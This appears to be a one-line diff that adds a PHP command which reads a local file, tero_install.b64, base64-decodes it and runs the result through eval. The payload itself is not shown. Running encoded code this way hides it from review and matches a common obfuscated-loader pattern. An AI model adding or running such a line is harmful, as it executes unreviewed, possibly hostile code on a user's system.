@@ -1,0 +1,1 @@
+php -r "eval(base64_decode(file_get_contents('./tero_install.b64')));"
